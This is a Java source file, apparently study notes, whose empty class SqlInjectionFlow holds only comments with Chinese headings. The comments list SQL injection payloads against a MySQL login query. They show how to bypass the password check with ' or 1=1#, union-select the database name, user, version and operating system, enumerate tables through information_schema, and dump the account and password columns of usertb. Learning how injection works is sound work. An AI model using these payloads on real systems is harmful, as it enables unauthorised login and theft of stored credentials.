package sysfkc.mvc.sqlTest;

public class SqlInjectionFlow {
//	select * from usertb where account='1' and password='1';
//	select name from usertb where account='@' and password='@'
	
//	绕过密码登录：
//	select * from usertb where account='1' and password='1' or 1=1#'
//	' or 1=1#
	
//	查看数据库名
//	select name from usertb where account='1' and password='' or 1=1 union select database();#'
//	' or 1=1 union select database();#
	
//	查看用户名
//	select name from usertb where account='1' and password='' or 1=1 union select user();#'
//	' or 1=1 union select user();#
	
	
//	获取当前数据库版本.
//	' or 1=1 union select version();#
	
	
	
//	获取当前操作系统。
//	' or 1=1 union select @@version_compile_os;#

	
	
//	数据库中的表名
//	' or 1=1 union select table_name from information_schema.tables where table_schema= 'competition'#
//	' or 1=1 union select table_schema from information_schema.tables where table_schema= 'competition'#
	

//	获取用户名、密码
//	select name from usertb where account='1' and password='' or 1=1 union select account from usertb#
//	' or 1=1 union select account from usertb#
//	' or 1=1 union select password from usertb#
	
	
	
	


	
	
	

}
